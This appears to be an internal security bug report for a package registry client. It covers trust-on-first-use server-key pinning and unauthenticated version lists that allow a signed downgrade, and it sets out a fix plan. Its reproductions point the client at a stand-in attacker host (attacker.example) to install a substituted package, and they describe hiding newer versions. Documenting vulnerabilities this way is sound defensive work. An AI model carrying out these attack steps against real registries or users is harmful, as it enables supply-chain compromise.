# bug-189: registry client trust is bootstrap-TOFU and version-list downgrade is undefended by default

Last updated: 2026-07-14
Effort: large (3h–1d)
Severity: MEDIUM
Class: Security

Status: Open
Regression Test: tests/rt-behavior/registry_client_pin_and_downgrade (to be added)

The compiler-side registry client anchors the entire package-trust chain on the
registry's Ed25519 server key, which it pins **trust-on-first-use** (whatever
`/ident` returns on the first contact is written and thereafter enforced). The
out-of-band pin that closes this (`mfb repo trust <registry-id> <fingerprint>`)
is opt-in and the default registry ships no baked-in root fingerprint. Separately,
the `/index` version list the client selects from is not integrity-protected in
the default path — only the owner→identKey name binding is signature-checked, not
the `versions[]` array — so a malicious or post-bootstrap-MITM registry can
truncate/withhold newer versions to force a **downgrade** to an older but validly
signed (and possibly vulnerable) release. The anti-rollback mechanisms (signed
snapshot metadata, transparency-log inclusion) exist but are opt-in. The single
correct behavior a fix produces: first-contact trust requires an OOB-verified
anchor (or explicit confirmation), and version selection on resolve/update/add is
gated by a signed, monotonic snapshot / mandatory log-inclusion so a registry
cannot silently hide newer versions.

These are the new findings **SUP-02** (first-contact TOFU) and **SUP-03**
(version-list downgrade). SUP-04 confirmed the reassuring half: install is *not*
blind — the full §3.5 signature chain runs at install and again at build, blobs
are SHA-256-verified, and no package code executes at install/resolve time. See
`planning/audit-2-supply-chain.md`.

References:

- `planning/audit-2-supply-chain.md` (SUP-01/02/03/04)
- TOFU pin: `repository/src/local.rs:240-254` (`pin_server_key` — `if path.is_file()`
  compare-else-write), fetched by `repository/src/client.rs:26-34`
  (`ensure_server_key`).
- OOB pin (opt-in): `mfb repo trust` → `client.rs:625-651` (`verify_pinned_metadata`
  is a no-op when no root is pinned).
- Unauthenticated version list: `fetch_index` verifies only the name binding
  (`client.rs:889-914`); selection at `src/cli/pkg.rs:593-631`,
  `src/cli/resolve.rs:312-392`; opt-in anti-rollback at `client.rs:489-663`
  (`verify_registry_metadata`) and `client.rs:382-421` (`verify_publish_inclusion`,
  only under `mfb pkg verify --proof`).
- Transport enabler: default `DEFAULT_REPO_URL = "http://127.0.0.1:7777"`
  (`repository/src/lib.rs:12`); no scheme enforcement (SUP-01).

## Failing Reproduction

SUP-02 (first-contact MITM):
```
# Clean machine (no ~/.mfb/<hash>/server.pub). Point at an attacker that answers
# /ident with attacker key K, /index/<owner>#<pkg> with a name binding signed by
# K, and /blob/<h> with a package signed by attacker ident + attested by K:
MFB_REPO_URL=http://attacker.example mfb pkg add alice#toolbox
```
- Observed: the package verifies (`classify_installed_package` → Verified),
  installs, and the attacker ident key is pinned into `project.json` — a fully
  substituted package accepted because every §3.5 check chains back to the
  attacker-pinned server key.
- Expected: first contact requires an OOB-verified anchor (baked-in root
  fingerprint or `mfb repo trust`) or explicit fingerprint confirmation before any
  package is trusted.

SUP-03 (downgrade / version hiding):
```
# alice#toolbox has 1.0.0 (vulnerable) and 1.1.0 (fixed), both validly signed.
# The (pinned or MITM'd) registry returns an /index listing only 1.0.0
# (or marks 1.1.0 yanked):
mfb pkg update
```
- Observed: the resolver selects 1.0.0, it passes every §3.5 check (it was
  genuinely signed by the owner), and locks — a signature-preserving downgrade.
- Expected: a signed, monotonic snapshot / `indexHash` (or mandatory log
  inclusion of the selected version against the monotonic checkpoint) prevents
  silently hiding 1.1.0.

## Root Cause

- SUP-02: `pin_server_key` (`local.rs:242`) trusts-on-first-use; the closing OOB
  pin is opt-in and `verify_pinned_metadata` no-ops without a pinned root. The
  plaintext-`http` default (SUP-01) lowers the bar from CA-compromise to
  on-path-tamper.
- SUP-03: `fetch_index` authenticates only the identKey name binding, not the
  version list, `hash`, `state`, or freshness. Anti-rollback (`verify_registry_metadata`
  snapshot chain; `verify_publish_inclusion`) is only invoked under `mfb repo trust`
  / `--proof`, never by the default `install`/`update`/`add`.

## Goal

- First registry contact requires an OOB-verified anchor (baked-in default-registry
  root fingerprint, or `mfb repo trust`, or an explicit confirmation of the fetched
  fingerprint) before any package is trusted or pinned.
- `resolve`/`update`/`add` enforce the signed, monotonic snapshot chain (or
  mandatory transparency-log inclusion) so the registry cannot hide newer versions
  or roll back the index.
- Non-loopback registry URLs require `https` (or emit a loud warning); `http`
  allowed only for loopback (SUP-01, small; fold in).

### Non-goals (must NOT change)

- The install/build-time §3.5 verification (already correct — do not weaken it).
- The cross-publisher substitution defense (a blob must still be signed by the
  pinned ident key — this bug is about bootstrap + version selection, not that).
- The `.mfp`/ABI formats.

## Blast Radius

- `repository/src/local.rs` / `client.rs` bootstrap — require an anchor on first
  pin.
- `src/cli/pkg.rs`, `src/cli/resolve.rs` version selection — make the signed
  snapshot / log-inclusion check mandatory on the default paths.
- `repository/src/client.rs` transport — enforce `https` for non-loopback (SUP-01).
- Registry server must serve the signed snapshot/`indexHash` the client now
  requires (cross-ref Surface 7 TUF metadata routes).

## Fix Design

Ship a pinned root fingerprint for the default registry and require it (or
`mfb repo trust`) before the first package install on an unpinned store; at a
minimum print the fetched server fingerprint and require confirmation on first
pin. Bind the `/index` version list under a server-signed `indexHash` inside the
snapshot metadata and enforce `snapshotVersion` monotonicity by default on
resolve/update/add (promote today's opt-in `verify_registry_metadata` to
mandatory). Require `https` for non-loopback registry URLs. Rejected
alternative: relying on TLS alone for authenticity — the design (correctly)
anchors trust in signatures, so the fix must strengthen the signature/pinning
path, not substitute TLS for it.

## Phases

### Phase 1 — failing test + audit
- [ ] Add tests: a first-contact install against an unpinned store without an
      anchor is refused (or requires confirmation); a resolve against an index
      hiding a newer version is rejected by the mandatory snapshot check. Confirm
      both currently succeed.

### Phase 2 — the fix
- [ ] Require an OOB anchor / confirmation on first pin; make the signed snapshot
      chain mandatory on resolve/update/add; enforce `https` for non-loopback.

### Phase 3 — validation
- [ ] Full suite + registry suite green; legitimate pinned-registry flows
      unaffected.

## Validation Plan

- Regression tests: the two reproductions above, plus a positive path with a
  correctly pinned root.
- Runtime proof: `mfb pkg add`/`update` against a hostile registry is refused at
  bootstrap and at version selection.
- Full suite: `scripts/test-accept.sh` + `cd repository && cargo test`.

## Summary

The install/build verification is already strong; the residual exposure is the
bootstrap trust window and version-selection integrity. The fix is service +
client policy work (pinning, mandatory snapshot verification, https), not new
cryptography. SUP-01 (plaintext default) folds in as a small transport-hardening
step.
